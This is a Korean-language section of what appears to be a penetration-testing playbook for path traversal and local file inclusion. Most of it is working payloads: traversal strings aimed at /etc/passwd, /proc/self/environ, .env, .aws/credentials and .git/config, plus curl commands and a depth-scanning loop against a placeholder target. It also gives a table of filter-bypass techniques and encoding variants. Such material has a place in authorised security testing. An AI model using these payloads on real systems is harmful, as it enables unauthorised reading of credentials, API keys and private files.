### Phase 2: 동적 테스트 (검증)

**기본 페이로드:**

**Linux 시스템 파일 (읽기 전용, 무해):**
- `../../../../etc/passwd` (query)
- `../../../etc/hostname`
- `/etc/passwd` (절대 경로 직접)
- `../../../../etc/shadow` (root 권한 시 — 보통 불가)
- `../../../../etc/group`
- `../../../../etc/issue`
- `../../../../proc/version`

**Windows 시스템 파일:**
- `..\\..\\..\\windows\\win.ini`
- `C:\\Windows\\win.ini`
- `..\\..\\..\\boot.ini`
- `C:\\Windows\\System32\\drivers\\etc\\hosts`

**`/proc/self/*` 정보 노출 (영향도 격상):**
- `../../../../proc/self/environ` (환경변수 — API 키/DB 비밀번호)
- `../../../../proc/self/cmdline`
- `../../../../proc/self/cwd/`
- `../../../../proc/self/maps`
- `../../../../proc/self/status`
- `../../../../proc/self/fd/0`

**애플리케이션 파일:**
- `../package.json`
- `../next.config.js`
- `../config.yml`, `../application.yml`
- `../.env`
- `../docker-compose.yml`
- `../Dockerfile`
- `../.git/config`
- `../.aws/credentials`

**Internal API path** (`INTERNAL_API_TRAVERSAL` 라벨):
```bash
# %2f로 path 삽입
curl "https://target/api/bots/abc%2f..%2fadmin%2fdelete"

# # fragment로 뒤 무효화
curl "https://target/api/bots/abc%2fadmin%23"

# double encoding
curl "https://target/api/bots/abc%252f..%252fadmin"

# Tomcat ;jsessionid trick
curl "https://target/api/bots/abc%2f..;jsessionid=x%2fadmin"
```

**Dynamic import** (`DYNAMIC_IMPORT` 라벨):
```bash
# require(userInput)
curl "https://target/api/plugin?name=../../../../etc/passwd"
curl "https://target/api/plugin?name=/proc/self/environ"

# Python importlib
curl "https://target/api/module?name=os"  # 임의 모듈 import
```

**OOB/에러 기반 확인:**
```bash
# 존재하는 파일 vs 존재하지 않는 파일 응답 diff
curl -w "%{http_code} %{size_download}\n" "https://target/api/files?name=../../../etc/passwd"
curl -w "%{http_code} %{size_download}\n" "https://target/api/files?name=../../../etc/no-such-file"

# file:// 스킴 (특정 서버)
curl "https://target/api/fetch?url=file:///etc/passwd"
```

**체계적 시도 (다양한 깊이):**
```bash
for d in 1 2 3 4 5 6 7 8 9 10; do
  prefix=$(printf '../%.0s' $(seq 1 $d))
  curl -s "https://target/api/files?name=${prefix}etc/passwd" -o /tmp/$d.txt
  echo "depth=$d size=$(wc -c < /tmp/$d.txt)"
done
```

---

**우회 페이로드:**

| 방어 | 우회 |
|---|---|
| `..` 단일 차단 (`replace("..", "")`) | `....//`, `....\\\\`, `..%2f`, `..%5c`, chained replace 후 `..` 복원 |
| URL 디코딩 후 `..` 검증 | Double encoding `%252e%252e%252f`, UTF-8 overlong `..%c0%af` |
| 확장자 화이트리스트 (`.pdf`만) | Null byte `file.pdf%00.php` (구버전 PHP/Node), double ext `file.pdf.php`, Windows ADS `file.pdf::$DATA` |
| `path.resolve()` + `startsWith(BASE)` | Symlink 추가 (공격자가 base 안 쓰기 권한 있을 때), TOCTOU race |
| 절대경로 차단 (`isAbsolute`) | Windows `\path`, UNC `\\\\server\\share`, `%SYSTEMROOT%` |
| Path normalization 후 검증 | Tomcat `..;/`, Jetty `..%5c`, IIS `..\..\..` 컨테이너별 파싱 |
| Unicode 정규화 누락 | `．．／` (fullwidth), `..%c0%af` 일부 OS/언어 |
| 블랙리스트 스킴 (`file:`) | `php://filter/resource=/etc/passwd`, `gopher://`, `dict://`, `jar://`, `expect://` |
| 화이트리스트 prefix | `/safe/../../../etc/passwd`, `/safe/.@evil` |

**다양한 인코딩 변형:**
```
../etc/passwd                       (raw)
%2e%2e%2fetc%2fpasswd               (URL encode)
%252e%252e%252fetc%252fpasswd       (double URL encode)
..%c0%af..%c0%afetc/passwd          (UTF-8 overlong)
..%u002f..%u002fetc/passwd          (Unicode escape, IIS)
..\\..\\..\\etc/passwd              (mixed)
..%5c..%5c..%5cetc/passwd           (URL encoded backslash)
....//....//....//etc/passwd        (double dot+slash)
%2e%2e/%2e%2e/etc/passwd            (mixed encode)
```

---

**참고사항:**

- `/etc/passwd`는 읽기 전용 + 민감 정보 없음 → 안전 확인 타깃
- `/proc/self/environ`은 환경변수 (API 키/DB 비밀번호 노출 빈번) → 영향도 격상
- `/proc/self/cmdline`은 프로세스 인자 노출 — DB 비밀번호가 인자로 들어가면 노출
- `/proc/self/cwd/.git/HEAD` 같은 패턴으로 작업 디렉토리 정보 추출
- Internal API traversal은 gateway/프록시 체인 환경에서 주로 발생 — Spring `WebClient.uri()`
- Tomcat `..;/` 같은 path parameter는 컨테이너별 파싱 차이 — gateway 단에서만 정규화하면 우회
- Symlink 추가 공격은 업로드 기능이 있을 때만 가능 — file-upload-scanner 결합
- `php://filter/resource=`는 PHP 특수 — base64 인코딩된 파일 내용 노출
- Windows ADS (`::$DATA`)는 NTFS 한정 — IIS/ASP.NET 환경
- 블라인드 LFI는 응답 크기/시간 diff로 추정 — OOB (외부 콜백 유발) 있으면 확정
- `require`/`include`/`importlib.import_module` 동적 import는 LFI + 코드 실행 게이트
- Windows 8.3 short filename (`PROGRA~1`)도 우회 변형 잔존
- `.git/config`, `.aws/credentials`, `.env`, `.ssh/id_rsa` 같은 민감 파일이 가장 큰 영향
- `/proc/[pid]/fd/[N]` 파일 descriptor 직접 읽기 (열린 파일 핸들)
- 화이트리스트는 prefix만 검사하면 path traversal로 base 밖 점프 가능
- 응답에 `<binary>` 같이 표시되면 binary 파일 (etc/passwd 외) 노출 가능
